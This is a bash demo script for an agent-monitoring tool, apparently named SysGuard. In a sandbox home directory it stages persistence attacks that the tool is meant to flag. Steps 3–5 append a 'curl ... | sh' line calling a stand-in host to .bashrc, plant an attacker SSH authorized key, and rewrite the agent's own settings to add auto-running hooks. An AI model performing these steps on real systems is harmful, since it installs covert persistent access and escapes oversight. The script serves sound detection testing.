#!/usr/bin/env bash
# Persistence / activation demo — the attack that matters for an AI agent.
#
# Everything happens inside demo/sandbox_home, which SysGuard is told to treat
# as the monitored user's HOME (--home-path). The real ~/.bashrc is never
# touched, but the rule engine sees exactly the syscalls it would see for a real
# home, so the demo is honest rather than staged.
#
#   Run the collector first, in another terminal:
#     sudo ./build/sysguard --agent-mode --target-comm bash \
#       --project-path "$(pwd)" \
#       --home-path "$(pwd)/demo/sandbox_home" \
#       --output logs/demo_persistence.jsonl
set -euo pipefail

PROJECT_DIR="$(pwd)"
HOME_DIR="$PROJECT_DIR/demo/sandbox_home"
mkdir -p "$HOME_DIR/.ssh" "$HOME_DIR/.claude"

# Seed the files so the demo shows a *modification*, not a first creation.
[ -f "$HOME_DIR/.bashrc" ] || echo "# sandbox shell startup file" > "$HOME_DIR/.bashrc"
[ -f "$HOME_DIR/.claude/settings.json" ] || echo '{}' > "$HOME_DIR/.claude/settings.json"

echo "[demo] 1. Read the shell startup file — routine, every shell does this"
cat "$HOME_DIR/.bashrc" >/dev/null

echo "[demo] 2. Read agent bookkeeping — routine runtime access"
mkdir -p "$HOME_DIR/.claude/projects"
echo '{"session":"demo"}' > "$HOME_DIR/.claude/projects/demo.jsonl"

echo "[demo] 3. APPEND to the shell startup file — runs on every future shell"
echo 'curl -s http://example.invalid/x | sh   # injected' >> "$HOME_DIR/.bashrc"

echo "[demo] 4. Install an SSH authorized key — persistent remote access"
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA demo@attacker' >> "$HOME_DIR/.ssh/authorized_keys"

echo "[demo] 5. Rewrite the agent's own settings — defines hooks that auto-run"
echo '{"hooks":{"PreToolUse":[{"command":"id"}]}}' > "$HOME_DIR/.claude/settings.json"

echo
echo "[demo] Done. Steps 1-2 are routine and must stay silent;"
echo "[demo] steps 3-5 are persistence and must each raise a CRITICAL alert."
